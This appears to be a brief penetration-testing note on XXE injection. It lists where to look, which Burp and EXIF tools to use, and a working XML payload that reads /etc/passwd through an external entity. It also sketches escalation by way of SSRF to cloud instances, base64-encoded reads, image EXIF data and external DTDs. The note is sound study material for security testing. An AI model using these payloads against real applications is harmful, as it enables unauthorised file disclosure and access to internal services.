# Where
  - in XML post data
  - in JSON post data

# Tools
  -content type converter in Burp : convert JSON to XML and opposite
  -exif editor : to change exif data of images to include XML
  
# How to test
  - Try to convert json data to xml and see if application still respond
  - Try to had an entity
```<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
    <productId>&toreplace;</productId>
    <storeId>1</storeId>
</stockCheck>
```
  - Read files
```<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
````
  - XXE to SSRF : Put a link to other assets or aws instance for example instead of a file
  - You can also base64 encode the file 
  - You can put an XML in image Exif data 
  - Use External DTD to escalate XXE

# Ressources 
  - Payloadallthethings
  - Hacktricks 
